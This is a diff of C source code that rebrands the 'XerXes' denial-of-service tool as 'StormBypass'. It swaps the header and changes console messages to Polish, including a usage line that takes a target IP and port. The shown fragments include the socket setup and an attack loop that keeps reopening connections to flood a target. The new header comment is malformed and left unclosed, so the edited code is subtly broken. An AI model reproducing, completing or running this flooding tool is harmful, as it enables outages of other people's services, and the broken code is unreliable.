@@ -1,4 +1,4 @@
-/* XerXes - Most powerful dos tool */
+/* StormBypass by wasuna3 *\
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -36,12 +36,12 @@ int make_socket(char *host, char *port) {
 	if(p == NULL) {
 		if(servinfo)
 			freeaddrinfo(servinfo);
-		fprintf(stderr, "No connection could be made\n");
+		fprintf(stderr, "StormBypass > Uzyj: ./stormbypass <ip> <port>\n");
 		exit(0);
 	}
 	if(servinfo)
 		freeaddrinfo(servinfo);
-	fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
+	fprintf(stderr, "[Polaczono -> %s:%s]\n", host, port);
 	return sock;
 }
 
@@ -68,9 +68,9 @@ void attack(char *host, char *port, int id) {
 				sockets[x] = make_socket(host, port);
 			} else
 //				fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
-			fprintf(stderr, "[%i: Voly Sent]\n", id);
+			fprintf(stderr, "[%i: Polaczono]\n", id);
 		}
-		fprintf(stderr, "[%i: Wyslano pakiety]\n", id);
+		fprintf(stderr, "[%i: Polaczono]\n", id);
 		usleep(300000);
 	}
 }
